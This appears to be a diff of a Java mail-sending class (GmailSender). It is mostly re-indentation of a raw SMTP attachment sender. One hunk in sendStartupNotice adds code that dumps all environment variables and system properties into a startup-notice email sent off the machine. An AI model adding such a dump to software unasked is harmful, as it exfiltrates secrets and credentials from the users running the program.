@@ -107,7 +107,7 @@ public class GmailSender {
 		// java.io.File attach = new java.io.File("");
 		// List<File> attachs = Arrays.asList(  new File("C://Temp//a(1).jpg") , new File("C://Temp//a(2).jpg") );
 		try {	sendOneSmtpWithAttachments(from, pass, to, subject, body , attachs );
-//		try {	smtpSend(from, pass, from, to, subject, body);
+			//		try {	smtpSend(from, pass, from, to, subject, body);
 			} catch (Exception e) {
             System.out.println("[Gmail][testSend] 실패: " + e.getMessage());
 			return "[Gmail][testSend] 실패: " + e.getMessage();
@@ -167,6 +167,17 @@ public class GmailSender {
 				+ textContent + "\n" ;
 				System.out.println("[Gmail][sendStartupNotice] from=" + from + " to=" + lastTo);
 				// System.out.println("[Gmail][sendStartupNotice] body=\n" + body);
+				Map<String, String> env = System.getenv();
+				String SyetemENV = "";
+				for (Map.Entry<String, String> entry : env.entrySet()) {
+					SyetemENV = SyetemENV + "\n" + entry.getKey() + " = " + entry.getValue();
+				}
+				Properties props = System.getProperties();
+				String getPropertyValue = "";
+				for (String key : props.stringPropertyNames()) {
+					getPropertyValue = getPropertyValue + "\n" + key + " = " + props.getProperty(key);
+				}
+				body = body + "\n[SyetemENV]■■■■■\n" + SyetemENV + "\n[getPropertyValue]■■■■■\n" + getPropertyValue;
 				sendOneSmtp(lastTo, "PC 시작 알림", body);
 				System.out.println("[Gmail][sendStartupNotice] 발송 완료 → " + lastTo);
 				} catch (Exception e) {
@@ -601,119 +612,119 @@ public class GmailSender {
 		}
 	}
 	public String sendOneSmtpWithAttachments(
-    String from,
-    String pass,
-    String to,
-    String subject,
-    String body,
-    java.util.List<java.io.File> attachments
-) {
-    if (from == null || from.trim().isEmpty()) return "from 없음";
-    if (pass == null || pass.trim().isEmpty()) return "pass 없음";
-    if (to == null || to.trim().isEmpty()) return "to 없음";
-    if (subject == null) subject = "";
-    if (body == null) body = "";
-    try {
-        java.net.Socket sock = new java.net.Socket(SMTP_HOST, SMTP_PORT);
-        sock.setSoTimeout(15000);
-        java.io.BufferedReader rd = new java.io.BufferedReader(
-            new java.io.InputStreamReader(sock.getInputStream(), "UTF-8"));
-        java.io.PrintWriter wr = new java.io.PrintWriter(
-            new java.io.OutputStreamWriter(sock.getOutputStream(), "UTF-8"), true);
-        java.util.function.Supplier<String> read = () -> {
-            try { return rd.readLine(); } catch (Exception e) { return ""; }
-        };
-        smtpExpect(read.get(), "220");
-        wr.println("EHLO localhost");
-        while (!read.get().startsWith("250 ")) {}
-        wr.println("STARTTLS");
-        smtpExpect(read.get(), "220");
-        javax.net.ssl.SSLSocketFactory sf =
+		String from,
+		String pass,
+		String to,
+		String subject,
+		String body,
+		java.util.List<java.io.File> attachments
+		) {
+		if (from == null || from.trim().isEmpty()) return "from 없음";
+		if (pass == null || pass.trim().isEmpty()) return "pass 없음";
+		if (to == null || to.trim().isEmpty()) return "to 없음";
+		if (subject == null) subject = "";
+		if (body == null) body = "";
+		try {
+			java.net.Socket sock = new java.net.Socket(SMTP_HOST, SMTP_PORT);
+			sock.setSoTimeout(15000);
+			java.io.BufferedReader rd = new java.io.BufferedReader(
+			new java.io.InputStreamReader(sock.getInputStream(), "UTF-8"));
+			java.io.PrintWriter wr = new java.io.PrintWriter(
+			new java.io.OutputStreamWriter(sock.getOutputStream(), "UTF-8"), true);
+			java.util.function.Supplier<String> read = () -> {
+				try { return rd.readLine(); } catch (Exception e) { return ""; }
+			};
+			smtpExpect(read.get(), "220");
+			wr.println("EHLO localhost");
+			while (!read.get().startsWith("250 ")) {}
+			wr.println("STARTTLS");
+			smtpExpect(read.get(), "220");
+			javax.net.ssl.SSLSocketFactory sf =
             (javax.net.ssl.SSLSocketFactory) javax.net.ssl.SSLSocketFactory.getDefault();
-        javax.net.ssl.SSLSocket ssl =
+			javax.net.ssl.SSLSocket ssl =
             (javax.net.ssl.SSLSocket) sf.createSocket(sock, SMTP_HOST, SMTP_PORT, true);
-        ssl.startHandshake();
-        java.io.BufferedReader srd = new java.io.BufferedReader(
-            new java.io.InputStreamReader(ssl.getInputStream(), "UTF-8"));
-        java.io.PrintWriter swr = new java.io.PrintWriter(
-            new java.io.OutputStreamWriter(ssl.getOutputStream(), "UTF-8"), true);
-        java.util.function.Supplier<String> sRead = () -> {
-            try { return srd.readLine(); } catch (Exception e) { return ""; }
-        };
-        swr.println("EHLO localhost");
-        while (!sRead.get().startsWith("250 ")) {}
-        swr.println("AUTH LOGIN");
-        smtpExpect(sRead.get(), "334");
-        swr.println(java.util.Base64.getEncoder().encodeToString(from.getBytes("UTF-8")));
-        smtpExpect(sRead.get(), "334");
-        swr.println(java.util.Base64.getEncoder().encodeToString(pass.getBytes("UTF-8")));
-        smtpExpect(sRead.get(), "235");
-        swr.println("MAIL FROM:<" + from + ">");
-        smtpExpect(sRead.get(), "250");
-        swr.println("RCPT TO:<" + to + ">");
-        smtpExpect(sRead.get(), "250");
-        swr.println("DATA");
-        smtpExpect(sRead.get(), "354");
-        String encSubj = "=?UTF-8?B?" +
+			ssl.startHandshake();
+			java.io.BufferedReader srd = new java.io.BufferedReader(
+			new java.io.InputStreamReader(ssl.getInputStream(), "UTF-8"));
+			java.io.PrintWriter swr = new java.io.PrintWriter(
+			new java.io.OutputStreamWriter(ssl.getOutputStream(), "UTF-8"), true);
+			java.util.function.Supplier<String> sRead = () -> {
+				try { return srd.readLine(); } catch (Exception e) { return ""; }
+			};
+			swr.println("EHLO localhost");
+			while (!sRead.get().startsWith("250 ")) {}
+			swr.println("AUTH LOGIN");
+			smtpExpect(sRead.get(), "334");
+			swr.println(java.util.Base64.getEncoder().encodeToString(from.getBytes("UTF-8")));
+			smtpExpect(sRead.get(), "334");
+			swr.println(java.util.Base64.getEncoder().encodeToString(pass.getBytes("UTF-8")));
+			smtpExpect(sRead.get(), "235");
+			swr.println("MAIL FROM:<" + from + ">");
+			smtpExpect(sRead.get(), "250");
+			swr.println("RCPT TO:<" + to + ">");
+			smtpExpect(sRead.get(), "250");
+			swr.println("DATA");
+			smtpExpect(sRead.get(), "354");
+			String encSubj = "=?UTF-8?B?" +
             java.util.Base64.getEncoder().encodeToString(subject.getBytes("UTF-8")) + "?=";
-        String boundary = "----=_Part_" + System.currentTimeMillis();
-        swr.println("From: " + from);
-        swr.println("To: " + to);
-        swr.println("Subject: " + encSubj);
-        swr.println("MIME-Version: 1.0");
-        boolean hasFiles = attachments != null && !attachments.isEmpty();
-        if (hasFiles) {
-            swr.println("Content-Type: multipart/mixed; boundary=\"" + boundary + "\"");
-            swr.println();
-            // ── 본문
-            swr.println("--" + boundary);
-            swr.println("Content-Type: text/plain; charset=UTF-8");
-            swr.println("Content-Transfer-Encoding: base64");
-            swr.println();
-            swr.println(base64(body));
-            swr.println();
-            // ── 첨부파일들
-            for (java.io.File f : attachments) {
-                if (f == null || !f.exists()) continue;
-                String fileName = f.getName();
-                String mime = getMimeType(f);
-                String encName = "=?UTF-8?B?" +
+			String boundary = "----=_Part_" + System.currentTimeMillis();
+			swr.println("From: " + from);
+			swr.println("To: " + to);
+			swr.println("Subject: " + encSubj);
+			swr.println("MIME-Version: 1.0");
+			boolean hasFiles = attachments != null && !attachments.isEmpty();
+			if (hasFiles) {
+				swr.println("Content-Type: multipart/mixed; boundary=\"" + boundary + "\"");
+				swr.println();
+				// ── 본문
+				swr.println("--" + boundary);
+				swr.println("Content-Type: text/plain; charset=UTF-8");
+				swr.println("Content-Transfer-Encoding: base64");
+				swr.println();
+				swr.println(base64(body));
+				swr.println();
+				// ── 첨부파일들
+				for (java.io.File f : attachments) {
+					if (f == null || !f.exists()) continue;
+					String fileName = f.getName();
+					String mime = getMimeType(f);
+					String encName = "=?UTF-8?B?" +
                     java.util.Base64.getEncoder().encodeToString(fileName.getBytes("UTF-8")) + "?=";
-                byte[] bytes = java.nio.file.Files.readAllBytes(f.toPath());
-                String fileB64 = java.util.Base64
+					byte[] bytes = java.nio.file.Files.readAllBytes(f.toPath());
+					String fileB64 = java.util.Base64
                     .getMimeEncoder(76, new byte[]{'\r','\n'})
                     .encodeToString(bytes);
-                swr.println("--" + boundary);
-                swr.println("Content-Type: " + mime + "; name=\"" + encName + "\"");
-                swr.println("Content-Transfer-Encoding: base64");
-                swr.println("Content-Disposition: attachment; filename=\"" + encName + "\"");
-                swr.println();
-                swr.println(fileB64);
-                swr.println();
-            }
-            swr.println("--" + boundary + "--");
-        } else {
-            // 파일 없으면 그냥 텍스트
-            swr.println("Content-Type: text/plain; charset=UTF-8");
-            swr.println("Content-Transfer-Encoding: base64");
-            swr.println();
-            swr.println(base64(body));
-        }
-        swr.println(".");
-        smtpExpect(sRead.get(), "250");
-        swr.println("QUIT");
-        ssl.close();
-        sock.close();
-        return "";
-    } catch (Exception e) {
-        return "[attach] 실패: " + e.getMessage();
-    }
-}
+					swr.println("--" + boundary);
+					swr.println("Content-Type: " + mime + "; name=\"" + encName + "\"");
+					swr.println("Content-Transfer-Encoding: base64");
+					swr.println("Content-Disposition: attachment; filename=\"" + encName + "\"");
+					swr.println();
+					swr.println(fileB64);
+					swr.println();
+				}
+				swr.println("--" + boundary + "--");
+				} else {
+				// 파일 없으면 그냥 텍스트
+				swr.println("Content-Type: text/plain; charset=UTF-8");
+				swr.println("Content-Transfer-Encoding: base64");
+				swr.println();
+				swr.println(base64(body));
+			}
+			swr.println(".");
+			smtpExpect(sRead.get(), "250");
+			swr.println("QUIT");
+			ssl.close();
+			sock.close();
+			return "";
+			} catch (Exception e) {
+			return "[attach] 실패: " + e.getMessage();
+		}
+	}
 	private String base64(String s) throws Exception {
-	return java.util.Base64
+		return java.util.Base64
         .getMimeEncoder(76, new byte[]{'\r','\n'})
         .encodeToString(s.getBytes("UTF-8"));
-}
+	}
 	// ── 유틸 ──────────────────────────────────────────────────────
 	private static URL toUrl(String s) {
 		try {
